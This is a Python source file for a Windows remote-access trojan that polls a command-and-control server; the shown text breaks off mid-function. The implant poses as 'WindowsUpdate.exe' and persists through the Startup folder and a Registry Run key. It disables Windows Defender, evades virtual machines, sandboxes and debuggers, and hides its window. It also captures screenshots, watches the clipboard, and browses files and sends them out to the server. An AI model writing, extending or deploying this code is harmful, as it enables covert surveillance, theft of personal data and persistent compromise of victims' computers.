import socket
import subprocess
import os
import threading
import json
import base64
import sys
import time
import platform
import random
import requests
import winreg
from dotenv import load_dotenv

load_dotenv()
import ctypes
from shutil import copyfile

PERSISTENCE_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
PAYLOAD_NAME = "WindowsUpdate.exe"  # Renamed to look legitimate

# === CONFIG ===
C2_DOMAIN = os.getenv("C2_DOMAIN", "http://127.0.0.1:443").rstrip("/")  # Strip trailing slash to prevent double-slash URLs
RETRY_DELAY = 30  # seconds
RETRY_BACKOFF_MIN = 5   # minimum backoff when server is down
RETRY_BACKOFF_MAX = 60  # maximum backoff when server is down
POLLING_DELAY = 5  # Check for commands every N seconds
JITTER = 2  # Random jitter +/- seconds added to polling
MUTEX_NAME = "Global\\WindowsUpdateMutex"  # Prevent multiple instances
LOCK_FILE = os.path.join(os.getenv("TEMP", "."), ".wupdate.lock")  # Lockfile fallback
XOR_KEY = 0x5A  # Simple XOR key for payload obfuscation
ANTI_VM = False  # Set to False if you're testing in a VM
# ================

# === STEALTH: Realistic User-Agent Pool ===
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Vivaldi/6.7.3329.41",
]

# Track current working directory for cd support
current_dir = os.getcwd()
client_id = None  # Set after registration


# === AES-256 + RSA Hybrid Encryption ===
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes

aes_session_key = get_random_bytes(32)  # 256-bit AES key
server_rsa_pub_key = None

def fetch_server_rsa_pub():
    """Fetch server RSA public key during startup handshake"""
    global server_rsa_pub_key
    try:
        url = f"{C2_DOMAIN}/rsa_pub"
        print(f"[*] Fetching RSA public key from {url}...")
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200 and resp.text.strip():
            server_rsa_pub_key = RSA.import_key(resp.text)
            print("[+] RSA public key fetched successfully.")
            return True
        else:
            print(f"[!] Failed to fetch RSA key. Status: {resp.status_code}")
    except requests.exceptions.ConnectionError:
        print(f"[!] Cannot connect to server at {C2_DOMAIN} — is server.py running?")
    except Exception as e:
        print(f"[!] Error fetching RSA key: {e}")
    return False

def encrypt_aes(data: str) -> str:
    """Encrypt string with AES-256-GCM"""
    cipher = AES.new(aes_session_key, AES.MODE_GCM)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode('utf-8'))
    payload = cipher.nonce + tag + ciphertext
    return base64.b64encode(payload).decode()

def decrypt_aes(raw_b64: str) -> str:
    """Decrypt base64 encoded AES-256-GCM payload"""
    raw = base64.b64decode(raw_b64)
    nonce = raw[:16]
    tag = raw[16:32]
    ciphertext = raw[32:]
    cipher = AES.new(aes_session_key, AES.MODE_GCM, nonce=nonce)
    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
    return decrypted.decode('utf-8')


# === Encrypted C2 Communication Helpers ===
_http_session = None

def get_session():
    global _http_session
    if _http_session is None:
        _http_session = requests.Session()
        _http_session.headers.update({
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        })
    return _http_session

def c2_post(endpoint, data, timeout=10):
    """Send AES-encrypted POST (with RSA-encrypted session key for registration or direct AES for subsequent requests)"""
    print(f"[*] Sending POST to {endpoint}...")
    global server_rsa_pub_key
    json_data = json.dumps(data)
    
    if endpoint.strip("/") == "register":
        if not server_rsa_pub_key:
            fetch_server_rsa_pub()
        
        if server_rsa_pub_key:
            rsa_cipher = PKCS1_OAEP.new(server_rsa_pub_key)
            enc_session_key = base64.b64encode(rsa_cipher.encrypt(aes_session_key)).decode()
            encrypted_payload = encrypt_aes(json_data)
            
            hybrid_packet = {
                "encrypted_session_key": enc_session_key,
                "payload": encrypted_payload
            }
            resp = get_session().post(
                f"{C2_DOMAIN}{endpoint}",
                data=json.dumps(hybrid_packet),
                headers={"Content-Type": "application/json"},
                timeout=timeout
            )
            print(f"[*] Response from {endpoint}: {resp.status_code}")
            if resp.status_code != 200:
                print(f"[!] Server Error Detail: {resp.text}")
            return resp
            
    # Standard AES-encrypted request — pass client_id as query param for server lookup
    encrypted = encrypt_aes(json_data)
    params = {}
    if client_id:
        params["id"] = client_id
    resp = get_session().post(
        f"{C2_DOMAIN}{endpoint}",
        data=encrypted,
        headers={"Content-Type": "application/octet-stream"},
        params=params,
        timeout=timeout
    )
    print(f"[*] Response from {endpoint}: {resp.status_code}")
    if resp.status_code != 200:
        print(f"[!] Server Error Detail: {resp.text}")
    return resp

def c2_get(endpoint, params=None, timeout=10):
    """Send GET to C2 and decrypt AES response. Falls back to plain JSON if server has no session key (e.g. after restart)."""
    print(f"[*] Polling {endpoint}...")
    resp = get_session().get(f"{C2_DOMAIN}{endpoint}", params=params, timeout=timeout)
    if resp.status_code == 200 and resp.text.strip():
        try:
            decrypted = decrypt_aes(resp.text)
            return json.loads(decrypted)
        except Exception:
            pass
        # Fallback: server may have restarted without our session key
        try:
            data = json.loads(resp.text)
            if isinstance(data, dict):
                return data
        except Exception:
            pass
    return None


# === STEALTH: Anti-VM / Sandbox Detection ===
def is_vm_or_sandbox():
    """Detect if running inside a VM, sandbox, or analysis environment"""
    indicators = 0

    # Check for VM/analysis processes
    try:
        output = subprocess.check_output(
            "tasklist /FO CSV /NH", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace').lower()
        vm_processes = [
            "vmtoolsd", "vmwaretray", "vmwareuser", "vmacthlp",
            "vboxservice", "vboxtray",
            "sandboxiedcomlaunch", "sandboxierpcss",
            "joeboxcontrol", "joeboxserver",
        ]
        for proc in vm_processes:
            if proc in output:
                indicators += 2
    except Exception:
        pass

    # Check MAC address prefixes (VMware, VirtualBox, Hyper-V)
    try:
        output = subprocess.check_output(
            "getmac /FO CSV /NH", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace').upper()
        vm_macs = [
            "00-05-69", "00-0C-29", "00-1C-14", "00-50-56",  # VMware
            "08-00-27",  # VirtualBox
            "00-03-FF", "00-15-5D",  # Hyper-V
        ]
        for mac in vm_macs:
            if mac in output:
                indicators += 2
    except Exception:
        pass

    # Check system manufacturer via WMI
    try:
        output = subprocess.check_output(
            "wmic computersystem get manufacturer", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace').lower()
        if any(x in output for x in ["vmware", "virtualbox", "qemu", "xen", "innotek", "bochs"]):
            indicators += 3
    except Exception:
        pass

    # Check for small disk (VMs often < 60GB)
    try:
        output = subprocess.check_output(
            "wmic diskdrive get size", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace')
        for line in output.strip().split('\n'):
            line = line.strip()
            if line.isdigit():
                gb = int(line) / (1024 ** 3)
                if gb < 60:
                    indicators += 1
                break
    except Exception:
        pass

    # Check CPU count (sandboxes often have 1-2 cores)
    try:
        if os.cpu_count() is not None and os.cpu_count() <= 2:
            indicators += 1
    except Exception:
        pass

    # Check Recent folder (sandboxes have very few recent files)
    try:
        recent = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Recent")
        if os.path.exists(recent) and len(os.listdir(recent)) < 5:
            indicators += 1
    except Exception:
        pass

    # Threshold: 3+ indicators = likely VM/sandbox
    return indicators >= 3


# === STEALTH: Anti-Debug Detection ===
def is_debugger_present():
    """Detect if a debugger or analysis tool is attached"""
    # Check Windows IsDebuggerPresent API
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except Exception:
        pass

    # Check for common analysis tools running
    try:
        output = subprocess.check_output(
            "tasklist /FO CSV /NH", shell=True,
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace').lower()
        analysis_tools = [
            "wireshark", "fiddler", "burpsuite", "charles",
            "procmon", "procexp", "processhacker",
            "ollydbg", "x64dbg", "x32dbg", "windbg",
            "ida", "ida64", "ghidra",
            "dnspy", "pestudio", "regshot",
            "autoruns", "tcpview",
        ]
        for tool in analysis_tools:
            if tool in output:
                return True
    except Exception:
        pass

    return False


# === STEALTH: Hide Console Window ===
def hide_console():
    """Hide the console window (fallback if --noconsole isn't working)"""
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
    except Exception:
        pass


# Global handle — must persist for the lifetime of the process
_mutex_handle = None
_lock_fh = None


def check_single_instance():
    """Ensure only one instance runs using mutex + lockfile fallback"""
    global _mutex_handle, _lock_fh

    # Method 1: Windows named mutex
    try:
        _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
        last_err = ctypes.windll.kernel32.GetLastError()
        if last_err == 183:  # ERROR_ALREADY_EXISTS
            sys.exit(0)
    except Exception:
        pass

    # Method 2: Lockfile (fallback if mutex somehow fails)
    try:
        if os.path.exists(LOCK_FILE):
            # Check if the PID in the lockfile is still alive
            with open(LOCK_FILE, "r") as f:
                old_pid = int(f.read().strip())
            # Check if process with that PID exists
            try:
                os.kill(old_pid, 0)  # Signal 0 = just check existence
                # Process is alive → another instance is running
                sys.exit(0)
            except (OSError, ProcessLookupError):
                pass  # Process is dead, stale lock — we can proceed

        # Write our PID
        _lock_fh = open(LOCK_FILE, "w")
        _lock_fh.write(str(os.getpid()))
        _lock_fh.flush()
    except Exception:
        pass


def add_persistence():
    """Add persistence via Startup folder + Registry Run key"""
    try:
        # Method 1: Startup folder
        payload_path = os.path.join(PERSISTENCE_PATH, PAYLOAD_NAME)
        if not os.path.exists(payload_path):
            copyfile(sys.executable, payload_path)

        # Method 2: Registry Run key (points to same path for now)
        try:
            regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(regkey)
        except:
            pass
    except:
        pass


def remove_persistence():
    """Remove all persistence mechanisms"""
    try:
        # Remove from Startup folder
        payload_path = os.path.join(PERSISTENCE_PATH, PAYLOAD_NAME)
        if os.path.exists(payload_path):
            os.remove(payload_path)
    except:
        pass
    try:
        # Remove registry key
        regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.DeleteValue(regkey, "WindowsUpdate")
        winreg.CloseKey(regkey)
    except:
        pass


def disable_defender():
    try:
        subprocess.Popen("powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.Popen("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        pass


def get_process_list():
    """Get list of running processes as JSON string"""
    try:
        # Using tasklist /FO CSV /V for detailed info including User and Window Title
        output = subprocess.check_output(
            "tasklist /FO CSV /V", shell=True, 
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        ).decode(errors='replace')
        
        import csv
        import io
        
        f = io.StringIO(output)
        reader = csv.DictReader(f)
        processes = []
        for row in reader:
            processes.append({
                "name": row.get("Image Name", "Unknown"),
                "pid": row.get("PID", "0"),
                "mem": row.get("Mem Usage", ""),
                "user": row.get("User Name", ""),
                "cpu": row.get("CPU Time", ""),
                "title": row.get("Window Title", "")
            })
        
        return "[JSON_PROCS]" + json.dumps(processes)
    except Exception as e:
        return f"[-] Error gathering processes: {str(e)}"


def get_system_info():
    """Gather detailed system information"""
    try:
        info_lines = []
        info_lines.append(f"Hostname    : {socket.gethostname()}")
        info_lines.append(f"OS          : {platform.system()} {platform.release()} ({platform.version()})")
        info_lines.append(f"Architecture: {platform.machine()}")
        info_lines.append(f"Processor   : {platform.processor()}")
        info_lines.append(f"Username    : {os.getlogin()}")
        info_lines.append(f"PID         : {os.getpid()}")
        info_lines.append(f"CWD         : {current_dir}")

        # Check admin privileges
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            info_lines.append(f"Admin       : {'Yes' if is_admin else 'No'}")
        except:
            info_lines.append(f"Admin       : Unknown")

        # Network interfaces
        try:
            result = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            info_lines.append(f"\n--- Network ---\n{result.decode('utf-8', errors='replace')}")
        except:
            pass

        return "\n".join(info_lines)
    except Exception as e:
        return f"[-] Error gathering sysinfo: {str(e)}"


def take_screenshot():
    """Capture screenshot and return base64 encoded PNG"""
    try:
        import mss
        import mss.tools
        with mss.mss() as sct:
            monitor = sct.monitors[0]  # Entire screen
            screenshot = sct.grab(monitor)
            # Convert to PNG bytes
            png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
            return base64.b64encode(png_bytes).decode()
    except ImportError:
        return "[-] mss module not available. Install with: pip install mss"
    except Exception as e:
        return f"[-] Screenshot error: {str(e)}"


def self_destruct():
    """Remove persistence, delete executable, and exit"""
    remove_persistence()
    try:
        # Schedule self-deletion via cmd after a short delay
        exe_path = sys.executable
        subprocess.Popen(
            f'cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q "{exe_path}"',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except:
        pass
    os._exit(0)


# === Clipboard Functions ===
_clipboard_monitor_active = False
_clipboard_thread = None
_last_clipboard = ""

# Set proper ctypes return/arg types for clipboard (prevents 64-bit pointer truncation)
ctypes.windll.user32.OpenClipboard.argtypes = [ctypes.c_void_p]
ctypes.windll.user32.OpenClipboard.restype = ctypes.c_bool
ctypes.windll.user32.CloseClipboard.restype = ctypes.c_bool
ctypes.windll.user32.GetClipboardData.argtypes = [ctypes.c_uint]
ctypes.windll.user32.GetClipboardData.restype = ctypes.c_void_p
ctypes.windll.kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
ctypes.windll.kernel32.GlobalLock.restype = ctypes.c_void_p
ctypes.windll.kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
ctypes.windll.kernel32.GlobalUnlock.restype = ctypes.c_bool


def get_clipboard():
    """Get current clipboard text content using ctypes (no dependencies)"""
    try:
        if not ctypes.windll.user32.OpenClipboard(None):
            return "[-] Clipboard is locked by another app"
        try:
            # CF_UNICODETEXT = 13
            handle = ctypes.windll.user32.GetClipboardData(13)
            if not handle:
                return "[-] Clipboard has no text data"
            ptr = ctypes.windll.kernel32.GlobalLock(handle)
            if not ptr:
                return "[-] Failed to lock clipboard memory"
            try:
                text = ctypes.wstring_at(ptr)
                if text:
                    return f"[+] Clipboard content:\n{text}"
                else:
                    return "[-] Clipboard is empty"
            finally:
                ctypes.windll.kernel32.GlobalUnlock(handle)
        finally:
            ctypes.windll.user32.CloseClipboard()
    except Exception as e:
        return f"[-] Clipboard error: {str(e)}"


def _clipboard_monitor_loop():
    """Background loop: check clipboard every 3s, send changes to C2"""
    global _last_clipboard, _clipboard_monitor_active

    while _clipboard_monitor_active:
        try:
            if not ctypes.windll.user32.OpenClipboard(None):
                time.sleep(3)
                continue
            try:
                handle = ctypes.windll.user32.GetClipboardData(13)
                if handle:
                    ptr = ctypes.windll.kernel32.GlobalLock(handle)
                    if ptr:
                        try:
                            current = ctypes.wstring_at(ptr) or ""
                        finally:
                            ctypes.windll.kernel32.GlobalUnlock(handle)
                    else:
                        current = ""
                else:
                    current = ""
            finally:
                ctypes.windll.user32.CloseClipboard()

            if current and current != _last_clipboard:
                _last_clipboard = current
                try:
                    c2_post("/result", {
                        "output": f"[📋 CLIPBOARD] {current}",
                        "client_id": client_id
                    })
                except Exception:
                    pass

        except Exception:
            pass

        time.sleep(3)


def start_clipboard_monitor():
    """Start background clipboard monitoring"""
    global _clipboard_monitor_active, _clipboard_thread
    if _clipboard_monitor_active:
        return
    _clipboard_monitor_active = True
    _clipboard_thread = threading.Thread(target=_clipboard_monitor_loop, daemon=True)
    _clipboard_thread.start()


def stop_clipboard_monitor():
    """Stop background clipboard monitoring"""
    global _clipboard_monitor_active
    _clipboard_monitor_active = False


# === File Browser ===
MAX_FILE_LIST_ITEMS = 500  # Cap to prevent massive payloads

def _format_size(size):
    """Format byte size to human readable string"""
    if size < 1024:
        return f"{size} B"
    elif size < 1024 * 1024:
        return f"{size / 1024:.1f} KB"
    elif size < 1024 * 1024 * 1024:
        return f"{size / (1024*1024):.1f} MB"
    else:
        return f"{size / (1024*1024*1024):.2f} GB"

def resolve_special_folder(folder_type):
    """Resolve Windows special folders dynamically via Registry (handles OneDrive redirection)"""
    home = os.path.expanduser('~')
    folder_type = folder_type.lower()
    reg_map = {
        'desktop': 'Desktop',
        'documents': 'Personal',
        'downloads': '{374DE290-123F-4565-9164-39C4925E467B}',
        'pictures': 'My Pictures',
        'videos': 'My Video',
        'music': 'My Music',
        'favorites': 'Favorites',
        'appdata': 'AppData',
    }
    
    # 1. Try Windows Registry (handles OneDrive Known Folder Move / redirection)
    if folder_type in reg_map:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders') as key:
                val, _ = winreg.QueryValueEx(key, reg_map[folder_type])
                path = os.path.expandvars(val)
                if os.path.isdir(path):
                    return path
        except Exception:
            pass

    # 2. Fallbacks with OneDrive checks
    onedrive_base = os.environ.get('OneDrive', os.path.join(home, 'OneDrive'))
    fallbacks = {
        'desktop': [os.path.join(home, 'Desktop'), os.path.join(onedrive_base, 'Desktop')],
        'documents': [os.path.join(home, 'Documents'), os.path.join(onedrive_base, 'Documents')],
        'downloads': [os.path.join(home, 'Downloads')],
        'pictures': [
            os.path.join(onedrive_base, 'Documents', 'Pictures'),
            os.path.join(onedrive_base, 'Pictures'),
            os.path.join(home, 'Pictures')
        ],
        'videos': [os.path.join(home, 'Videos'), os.path.join(onedrive_base, 'Videos')],
        'music': [os.path.join(home, 'Music'), os.path.join(onedrive_base, 'Music')],
        'favorites': [os.path.join(home, 'Favorites')],
        'onedrive': [onedrive_base, os.path.join(home, 'OneDrive')],
        'appdata': [os.environ.get('APPDATA', os.path.join(home, 'AppData', 'Roaming'))]
    }
    
    candidates = fallbacks.get(folder_type, [])
    for c in candidates:
        if os.path.isdir(c):
            return c
    return candidates[0] if candidates else os.path.join(home, folder_type.capitalize())


def browse_files(path=""):
    """List files and directories with details — returns JSON for fast frontend parsing"""
    global current_dir
    try:
        # Clean the path thoroughly
        clean_path = path.strip().strip('"').strip("'") if path else ""

        # Special case: Resolve well-known folders dynamically
        if clean_path.startswith("SPECIAL:"):
            folder_type = clean_path.split(":", 1)[1].lower()
            clean_path = resolve_special_folder(folder_type)

        # Clean again for drive check
        upper_path = clean_path.upper()

        # Special case: list drives — return JSON format
        if upper_path == "DRIVES":
            drives = []
            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
                if bitmask & 1:
                    drives.append({
                        "name": f"{letter}:/",
                        "size": "DRIVE",
                        "date": "-----",
                        "is_dir": True
                    })
                bitmask >>= 1
            result = {
                "path": "System Drives",
                "items": drives,
                "count": len(drives),
                "truncated": False
            }
            return "[JSON_FILES]" + json.dumps(result)

        # Handle path resolution
        target_path = clean_path if clean_path else current_dir
        
        # If it's a relative path, join with current_dir
        if not os.path.isabs(target_path) and not (len(target_path) >= 2 and target_path[1] == ':'):
            target_path = os.path.join(current_dir, target_path)
        
        target_path = os.path.abspath(target_path)

        if not os.path.isdir(target_path):
            return f"[-] Not a directory: {target_path}"

        # Auto-update current_dir so downloads and relative paths work
        current_dir = target_path

        dirs_list = []
        files_list = []
        try:
            # os.scandir() is 2-10x faster than os.listdir() + os.stat()
            # It caches stat info from the directory read itself
            with os.scandir(target_path) as scanner:
                for entry in scanner:
                    try:
                        # entry.is_dir() and entry.stat() use cached OS data — no extra syscalls
                        is_dir = entry.is_dir(follow_symlinks=False)
                        try:
                            stat = entry.stat(follow_symlinks=False)
                            mod_time = time.strftime("%Y-%m-%d %H:%M", time.localtime(stat.st_mtime))
                            size_str = "DIR" if is_dir else _format_size(stat.st_size)
                        except (PermissionError, OSError):
                            mod_time = "????"
                            size_str = "???" if not is_dir else "DIR"

                        item = {
                            "name": entry.name,
                            "size": size_str,
                            "date": mod_time,
                            "is_dir": is_dir
                        }
                        if is_dir:
                            dirs_list.append(item)
                        else:
                            files_list.append(item)
                    except (PermissionError, OSError):
                        files_list.append({
                            "name": entry.name,
                            "size": "???",
                            "date": "????",
                            "is_dir": False
                        })
        except PermissionError:
            return f"[-] Permission denied: {target_path}"

        # Sort: directories first (alphabetical), then files (alphabetical)
        dirs_list.sort(key=lambda x: x["name"].lower())
        files_list.sort(key=lambda x: x["name"].lower())
        all_items = dirs_list + files_list

        total_count = len(all_items)
        truncated = total_count > MAX_FILE_LIST_ITEMS
        if truncated:
            all_items = all_items[:MAX_FILE_LIST_ITEMS]

        result = {
            "path": target_path,
            "items": all_items,
            "count": total_count,
            "truncated": truncated
        }
        return "[JSON_FILES]" + json.dumps(result)

    except Exception as e:
        return f"[-] Browse error: {str(e)}"


import io
try:
    from PIL import Image
except ImportError:
    Image = None

def preview_file(path):
    """Generate instant image or text preview payload for remote files"""
    global current_dir
    try:
        clean_path = path.strip().strip('"').strip("'") if path else ""
        if not clean_path:
            return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": "No path provided"})

        target_path = clean_path
        if not os.path.isabs(target_path) and not (len(target_path) >= 2 and target_path[1] == ':'):
            target_path = os.path.join(current_dir, target_path)
        target_path = os.path.abspath(target_path)

        if not os.path.isfile(target_path):
            return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": f"File not found: {target_path}"})

        ext = os.path.splitext(target_path)[1].lower()
        size = os.path.getsize(target_path)
        size_str = _format_size(size)

        img_exts = {
            '.png': 'image/png',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.gif': 'image/gif',
            '.bmp': 'image/bmp',
            '.webp': 'image/webp',
            '.ico': 'image/x-icon'
        }
        text_exts = {
            '.txt', '.log', '.py', '.js', '.ts', '.jsx', '.tsx', '.json', '.xml',
            '.html', '.htm', '.css', '.ini', '.cfg', '.bat', '.ps1', '.cmd', '.sh',
            '.yaml', '.yml', '.md', '.csv', '.env', '.toml', '.sql', '.c', '.cpp',
            '.h', '.hpp', '.rs', '.go', '.java'
        }

        # 1. Image Preview
        if ext in img_exts:
            if Image is not None:
                try:
                    with Image.open(target_path) as img:
                        # Downscale only if extremely large to save bandwidth while keeping crisp preview
                        max_dim = 1600
                        if img.width > max_dim or img.height > max_dim:
                            img.thumbnail((max_dim, max_dim), Image.Resampling.LANCZOS)
                        
                        buf = io.BytesIO()
                        fmt = 'JPEG' if ext in ['.jpg', '.jpeg'] else 'PNG'
                        if fmt == 'JPEG' and img.mode in ('RGBA', 'LA', 'P'):
                            img = img.convert('RGB')
                        img.save(buf, format=fmt, quality=90)
                        b64_data = base64.b64encode(buf.getvalue()).decode('utf-8')
                        mime = 'image/jpeg' if fmt == 'JPEG' else 'image/png'
                        return "[JSON_PREVIEW]" + json.dumps({
                            "status": "ok",
                            "type": "image",
                            "name": os.path.basename(target_path),
                            "path": target_path,
                            "mime": mime,
                            "data": b64_data,
                            "size": size_str
                        })
                except Exception:
                    pass

            # Fallback to direct raw read for images
            with open(target_path, "rb") as f:
                raw_bytes = f.read()
                b64_data = base64.b64encode(raw_bytes).decode('utf-8')
            return "[JSON_PREVIEW]" + json.dumps({
                "status": "ok",
                "type": "image",
                "name": os.path.basename(target_path),
                "path": target_path,
                "mime": img_exts.get(ext, "image/png"),
                "data": b64_data,
                "size": size_str
            })

        # 2. Text / Code Preview
        elif ext in text_exts or size < 120000:
            try:
                with open(target_path, "r", encoding="utf-8", errors="replace") as f:
                    content = f.read(120000)
                return "[JSON_PREVIEW]" + json.dumps({
                    "status": "ok",
                    "type": "text",
                    "name": os.path.basename(target_path),
                    "path": target_path,
                    "content": content,
                    "size": size_str
                })
            except Exception as e:
                return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": f"Read error: {str(e)}"})

        # 3. Binary / Other files
        else:
            return "[JSON_PREVIEW]" + json.dumps({
                "status": "unsupported",
                "type": "binary",
                "name": os.path.basename(target_path),
                "path": target_path,
                "size": size_str,
                "message": "Direct preview is not supported for binary files. Use the Download button to retrieve the complete file."
            })

    except Exception as e:
        return "[JSON_PREVIEW]" + json.dumps({"status": "error", "message": str(e)})


def execute_command(cmd):
    """Execute a command and return the result"""
    print(f"[*] Executing command: {cmd}")
    global current_dir, POLLING_DELAY

    try:
        # === Built-in commands ===

        if cmd == "sysinfo":
            return get_system_info()

        elif cmd == "ps":
            return get_process_list()

        elif cmd.startswith("killproc "):
            target = cmd[9:].strip().strip('"').strip("'")
            try:
                if target.isdigit():
                    subprocess.check_output(f"taskkill /F /PID {target}", shell=True, stderr=subprocess.STDOUT)
                else:
                    # Ensure it has .exe if it's a name
                    if not target.lower().endswith(".exe"):
                        target += ".exe"
                    subprocess.check_output(f"taskkill /F /IM {target}", shell=True, stderr=subprocess.STDOUT)
                return f"[+] Process {target} killed"
            except Exception as e:
                return f"[-] Failed to kill process: {str(e)}"

        elif cmd == "screenshot":
            screenshot_data = take_screenshot()
            if screenshot_data.startswith("[-]"):
                return screenshot_data
            # Send screenshot as file upload
            try:
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                c2_post("/upload", {
                    "file": screenshot_data,
                    "name": f"screenshot_{timestamp}.png",
                    "client_id": client_id
                })
                return "[+] Screenshot captured and uploaded"
            except:
                return "[-] Screenshot captured but upload failed"

        elif cmd == "pwd":
            return current_dir

        elif cmd.startswith("cd "):
            path = cmd[3:].strip().strip('"').strip("'")
            if path == "~":
                path = os.path.expanduser("~")
            new_dir = os.path.normpath(os.path.join(current_dir, path))
            if os.path.isdir(new_dir):
                current_dir = os.path.abspath(new_dir)
                return f"[+] Changed directory to: {current_dir}"
            else:
                return f"[-] Directory not found: {new_dir}"

        elif cmd.startswith("sleep "):
            try:
                new_delay = int(cmd.split(" ", 1)[1])
                if 1 <= new_delay <= 3600:
                    POLLING_DELAY = new_delay
                    return f"[+] Polling interval changed to {new_delay}s"
                else:
                    return "[-] Sleep must be between 1 and 3600 seconds"
            except ValueError:
                return "[-] Invalid sleep value"

        elif cmd.startswith("dialog "):
            content = cmd[7:].strip()
            if "|" in content:
                title, message = content.split("|", 1)
                title = title.strip()
                message = message.strip()
            else:
                title = "Alert"
                message = content
            # Run on a separate thread so it doesn't block polling
            threading.Thread(
                target=lambda t=title, m=message: ctypes.windll.user32.MessageBoxW(0, m, t, 0x40),
                daemon=True
            ).start()
            return f"[+] Dialog shown: \"{title}\""

        elif cmd == "persist":
            add_persistence()
            return "[+] Persistence re-applied"

        elif cmd == "kill":
            # Send confirmation before dying
            try:
                c2_post("/result", {
                    "output": "[+] Self-destruct initiated. Goodbye.",
                    "client_id": client_id
                })
            except:
                pass
            self_destruct()

        elif cmd.startswith("download "):
            _, path = cmd.split(" ", 1)
            path = path.strip().strip('"').strip("'")
            # Resolve relative paths against current_dir
            if not os.path.isabs(path):
                path = os.path.join(current_dir, path)
            if os.path.exists(path):
                with open(path, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                c2_post("/upload", {
                    "file": data,
                    "name": os.path.basename(path),
                    "client_id": client_id
                })
                return f"[+] File uploaded to C2: {os.path.basename(path)}"
            else:
                return f"[-] File not found: {path}"

        elif cmd.startswith("upload "):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                return "[-] Usage: upload <url> <destination_path>"
            _, url, dst = parts
            if not os.path.isabs(dst):
                dst = os.path.join(current_dir, dst)
            r = get_session().get(url)  # Use session UA but no encryption (external URL)
            with open(dst, "wb") as f:
                f.write(r.content)
            return f"[+] Downloaded {url} to {dst}"

        # === Clipboard Commands ===
        elif cmd == "clip":
            return get_clipboard()

        elif cmd == "clipwatch":
            start_clipboard_monitor()
            return "[+] Clipboard monitor started (logging changes to C2)"

        elif cmd == "clipstop":
            stop_clipboard_monitor()
            return "[+] Clipboard monitor stopped"

        # === File Browser ===
        elif cmd == "ls" or cmd.startswith("ls "):
            # Improved argument parsing: handle quotes correctly
            raw_path = cmd[3:].strip() if cmd.startswith("ls ") else ""
            # If path is wrapped in quotes, extract content inside
            if (raw_path.startswith('"') and raw_path.endswith('"')) or (raw_path.startswith("'") and raw_path.endswith("'")):
                path = raw_path[1:-1]
            else:
                path = raw_path
            return browse_files(path)

        elif cmd.startswith("preview ") or cmd.startswith("view "):
            raw_path = cmd.split(" ", 1)[1].strip()
            if (raw_path.startswith('"') and raw_path.endswith('"')) or (raw_path.startswith("'") and raw_path.endswith("'")):
                path = raw_path[1:-1]
            else:
